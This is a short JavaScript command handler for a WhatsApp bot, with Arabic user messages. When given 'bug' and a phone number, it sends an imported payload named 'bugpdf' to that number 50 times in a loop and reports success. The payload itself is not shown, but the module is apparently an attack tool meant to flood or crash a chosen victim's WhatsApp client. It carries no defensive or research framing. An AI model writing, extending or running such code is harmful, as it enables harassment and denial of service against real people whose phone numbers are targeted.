const { bugpdf } = require('../bugpdf');

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("bug")) return;

  const parts = text.trim().split(' ');
  const number = parts[1];

  if (!number || isNaN(number)) {
    return reply("❌ يرجى كتابة رقم الهاتف بعد الأمر.\nمثال: bug 966xxxxxxxxx");
  }

  const jid = `${number}@s.whatsapp.net`;

  try {
    for (let i = 0; i < 50; i++) {
      await sock.sendMessage(jid, { text: bugpdf });
    }

    await reply(`✅ تم إرسال BugPDF إلى: ${number} عدد 50 مرة.`);
  } catch (err) {
    console.error(err);
    await reply(`❌ فشل في إرسال الرسائل إلى: ${number}`);
  }
};
